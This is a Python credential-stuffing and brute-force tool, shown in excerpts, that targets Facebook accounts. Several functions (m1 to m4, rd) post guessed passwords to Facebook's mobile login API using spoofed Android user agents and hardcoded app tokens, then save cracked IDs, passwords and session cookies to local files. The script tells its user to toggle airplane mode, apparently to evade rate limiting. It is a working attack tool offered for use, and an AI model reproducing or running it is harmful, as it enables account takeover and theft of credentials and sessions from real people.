...
xx=requests.get('https://github.com/ALEXANDERAXLMONTREAL/useragent/blob/main/list_user-agent.txt').text.splitlines()

model3 = requests.get('https://github.com/ALEXANDERAXLMONTREAL/models/blob/main/m8.txt').text.splitlines()

def AXLUAPH():
    END = '[FBAN/Orca-Android;FBAV/431.0.0.15.88;FBBV/24371651;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/277045699;FBCR/TNT;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-N7505;FBSV/10;FBCA/armeabi-v7a:armeabi;]'
...
def main():
	...
	else:print('\n INVALID CHOICE PLEASE CHOOSE CORRECT OPTION');time.sleep(1);main()
def file():
	clear()
	...
	clear()
	try:
		ps_limit = int(input(' HOW MANY PASSWORD YOU WANT TO ADD :  '))
	except:
		ps_limit =1
	line()
	print('\033[1;37m EXAMPLE : \033[1;37mfirst last, firtslast, first123, first1234')
	line()
	for i in range(ps_limit):
		plist.append(input(f'\033[1;37m PUT YOUR PASSLIST {i+1}: '))
	line()
	with tred(max_workers=20) as AXL:
		clear()
		tl = str(len(fo))
		print(' TOTAL ACCOUNT IDS : \033[1;32m'+tl)
		...
		for user in fo:
			...
			passlist = plist
			if mthd =='1':
				AXL.submit(m1,ids,names,passlist)
			elif mthd =='2':
				AXL.submit(m2,ids,names,passlist)
			elif mthd =='3':
				AXL.submit(m3,ids,names,passlist)
			elif mthd =='4':
				AXL.submit(m4,ids,names,passlist)
			else:
				print('bye tanga ka')
	print('\033[1;37m')
	line()
...
def gmail():
	...
	with tred(max_workers=30) as AXL:
		total = str(len(fo))
		clear()
		print(' TOTAL ACCOUNT IDS : \033[1;32m'+total)
		print(' \x1b[38;5;208mTURN ON & OFF FLIGHT (AIRPLANE) MODE BEFORE USE\033[1;37m')
		line()
		for user in fo:
			ids,names = user.split('|')
			...
			AXL.submit(rd,ids,passlist,fbcr)
	print('\033[1;37m')
	line()
	print(' THE PROCESS HAS COMPLETED')
	print(' TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
...
def rnd():
	...
	with tred(max_workers=15) as AXL:
		clear()
		total_ids = str(len(user))
		print(' TOTAL ACCOUNT IDS : \033[1;32m'+total_ids+'\033[1;37m SIM CODE : '+code)
		print(' \x1b[38;5;208mTURN ON & OFF FLIGHT (AIRPLANE) MODE BEFORE USE\033[1;37m')
		line()
		for psx in user:
			ids = code+psx
...
def m1(ids,names,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [AXLLL-M1] %s|\033[1;32mOK\033[1;37m[\033[1;32m%s\033[1;37m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if "session_key" in po:
				...
				print('\r\r\033[1;32m [AXLLL-OK] '+ids+' | '+pas)
				oks.append(ids)
				open('/sdcard/AXLLL/AXLLL-M1-OK.txt','a').write(ids+'|'+pas+'\n')
				...
				open('/sdcard/AXLLL/AXLLL-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
...
def m2(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [AXLLL-M2] %s|\033[1;32mOK\033[1;37m[\033[1;32m%s\033[1;37m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if "session_key" in po:
				...
				print('\r\r\033[1;32m [AXLLL-OK] '+ids+' | '+pas)
				oks.append(ids)
				open('/sdcard/AXLLL/AXLLL-M2-OK.txt','a').write(ids+'|'+pas+'\n')
				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
				open('/sdcard/AXLLL/AXLLL-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
...
def m3(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [AXLLL-M3] %s|\033[1;32mOK\033[1;37m[\033[1;32m%s\033[1;37m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if "session_key" in po:
				...
				print('\r\r\033[1;32m [AXLLL-OK] '+ids+' | '+pas)
				oks.append(ids)
				open('/sdcard/AXLLL/AXLLL-M3-OK.txt','a').write(ids+'|'+pas+'\n')
				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
				open('/sdcard/AXLLL/AXLLL-M3-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
...
def m4(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [AXLLL-M4] %s|\033[1;32mOK\033[1;37m[\033[1;32m%s\033[1;37m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if '350685531728' in accessToken:
				...
				fban = 'Orca-Android'
				fbpn = 'com.facebook.orca'
			ua = 'Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.9; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBPN/'+fbpn+';FBLC/'+fblc+';FBBV/'+fbbv+';FBCR/'+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBDV/'+model+';FBSV/'+fbsv+'.0.9;FBCA/'+fbca+';FBDM/{density='+str(random.randint(1,9))+'.'+str(random.randint(1,9))+',width='+str(random.randint(500,999))+',height='+str(random.randint(999,1999))+'};FB_FW/1;]'.replace('\n','')
			head = {"User-Agent":ua,"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
			data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"zh_HK","client_country_code":"HK","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
			if "session_key" in po:
				...
				print('\r\r\033[1;32m [AXLLL-OK] '+ids+' | '+pas)
				oks.append(ids)
				open('/sdcard/AXLLL/AXLLL-M4-OK.txt','a').write(ids+'|'+pas+'\n')
				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
				open('/sdcard/AXLLL/AXLLL-M4-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
...
def rd(ids,passlist,fbcr):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [AXLLL-XD] %s|\033[1;32mOK\033[1;37m[\033[1;32m%s\033[1;37m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
			tokenlist = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32','256002347743983|374e60f8b9bb6b8cbb30f78030438895']
			accessToken = random.choice(tokenlist)
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			...
			if "session_key" in po:
				...
				print('\r\r\033[1;32m [AXLLL-OK] '+ids+' | '+pas)
				oks.append(ids)
				open('/sdcard/AXLLL/AXLLL-RDM-OK.txt','a').write(ids+'|'+pas+'\n')
				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
				open('/sdcard/AXLLL/AXLLL-R-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
